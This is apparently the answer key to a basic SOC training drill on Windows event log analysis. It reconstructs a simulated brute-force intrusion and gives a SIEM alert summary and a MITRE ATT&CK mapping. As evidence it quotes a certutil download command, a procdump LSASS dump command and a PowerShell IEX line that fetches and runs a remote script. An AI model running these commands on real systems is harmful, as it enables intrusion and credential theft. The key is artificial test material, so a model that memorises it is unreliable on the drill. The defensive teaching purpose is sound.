# Solution: Drill 01 (Basic) — Windows Event Log Analysis

## Correct Answers

### Task 1: Authentication Events

1. **Failed logon attempts:** 6 failures (14:23:01, 14:23:02, 14:23:04, 14:25:00, 14:30:00, 14:44:55)
1. **Targeted account:** `jdavis`
1. **Attacker IP:** `203.0.113.44` (a public IP address — external attacker)
1. **Successful logon time:** `14:47:23`
1. **Logon Type:** 3 (Network logon) — this indicates the attacker connected via a network protocol (SMB, WMI, or similar), not RDP or physical console. They may have used stolen credentials with a remote execution tool.

**Note:** Event 4672 immediately after 4624 shows SeDebugPrivilege and SeImpersonatePrivilege were assigned — this is the account's admin token, confirming jdavis is an administrator.

---

### Task 2: Process Execution

Suspicious processes found after 14:47:00:

| Time | Process | Reason |
|------|---------|--------|
| 14:47:52 | `net.exe` | `net localgroup administrators` = enumerating admin group (reconnaissance) |
| 14:48:01 | `certutil.exe` | `-urlcache -f http://203.0.113.44/payload.exe` = **LOLBin file download** |
| 14:48:45 | `upd.exe` | Running from `C:\ProgramData\` — not a Windows binary, dropped by certutil |
| 14:49:10 | `procdump.exe` | `-ma lsass.exe lsass.dmp` = **credential dump from LSASS** |
| 14:52:00 | `powershell.exe` | `-EncodedCommand` spawned by `upd.exe` = malware running encoded PS |

**LOLBin identified:** `certutil.exe` with `-urlcache -f` downloads remote files — a well-documented abuse technique (MITRE T1105).

---

### Task 3: Persistence

| Mechanism | Details | Event ID |
|-----------|---------|---------|
| **Service** | `WinUpdateSvc` → `C:\ProgramData\upd.exe` (SYSTEM, Automatic) | 7045 |
| **Scheduled Task** | `\MicrosoftUpdateTask` — encoded PS command that downloads stage2.ps1 | 4698 |
| **Log Cleared** | jdavis cleared Security audit log at 15:22:10 | 1102 |

Decoded scheduled task command:
`IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.44/stage2.ps1')`

This downloads and executes a remote PowerShell script — a classic persistent backdoor.

---

### Task 4: LSASS Access

* **Process accessing LSASS:** `procdump.exe`

* **GrantedAccess:** `0x1010` = `PROCESS_VM_READ | PROCESS_QUERY_LIMITED_INFORMATION`

* **Meaning:** This access mask allows reading the process memory — exactly what credential dumpers need
* **Verdict:** Yes, this is a credential dump (confirmed by command line: `-ma lsass.exe lsass.dmp`)

The Sysmon Event ID 10 alert on LSASS with `0x1010` access is a **tier-1 SOC alert** — it should trigger immediate escalation.

---

### Task 5: Completed SIEM Alert Summary

```text
Alert: Multiple failed logons + success (SIEM Alert ID: ALT-2024-001)
Analyst: [Student Name]
Date: 2024-01-14

VERDICT: [X] True Positive

SUMMARY:
At 14:47:23, an attacker from IP 203.0.113.44 successfully compromised user
jdavis's credentials on FINANCE-WS-04 after 6 brute-force attempts. The attacker
then performed credential dumping, dropped malware, established persistence via a
service and scheduled task, and cleared the audit log.

POST-COMPROMISE ACTIVITY:
- Downloaded payload (upd.exe) using certutil.exe LOLBin (14:48:01)
- Dumped LSASS credentials via procdump.exe (14:49:10)
- Executed encoded PowerShell C2 beacon (14:52:00)

PERSISTENCE:
- Service: WinUpdateSvc (C:\ProgramData\upd.exe, SYSTEM, Automatic)
- Scheduled Task: \MicrosoftUpdateTask (downloads stage2.ps1 at logon)

RECOMMENDED ACTIONS:

1. IMMEDIATE: Isolate FINANCE-WS-04 from the network

2. IMMEDIATE: Reset jdavis password (credentials compromised via LSASS dump)
3. IMMEDIATE: Block 203.0.113.44 at perimeter firewall
4. Scan all systems for upd.exe and WinUpdateSvc service
5. Check if stage2.ps1 ran on any other systems

IOCs:
- IP: 203.0.113.44 (attacker C2)
- File: C:\ProgramData\upd.exe
- File: C:\Windows\Temp\lsass.dmp
- Service: WinUpdateSvc
- Task: \MicrosoftUpdateTask
- URL: http://203.0.113.44/payload.exe
- URL: http://203.0.113.44/stage2.ps1
```

---

## Attack Chain (MITRE ATT&CK)

| Tactic | Technique | ID | Evidence |
|--------|-----------|-----|---------|
| Initial Access | Valid Accounts: Brute Force | T1110 | 6 × 4625 → 4624 |
| Execution | Command and Script Interpreter | T1059.001 | certutil + PS |
| Execution | System Binary Proxy Execution | T1218.003 | certutil.exe |
| Credential Access | OS Credential Dumping: LSASS | T1003.001 | procdump + Sysmon 10 |
| Persistence | Create or Modify System Process: Windows Service | T1543.003 | Event 7045 |
| Persistence | Scheduled Task | T1053.005 | Event 4698 |
| Defense Evasion | Clear Windows Event Logs | T1070.001 | Event 1102 |
| Command and Control | Ingress Tool Transfer | T1105 | certutil download |
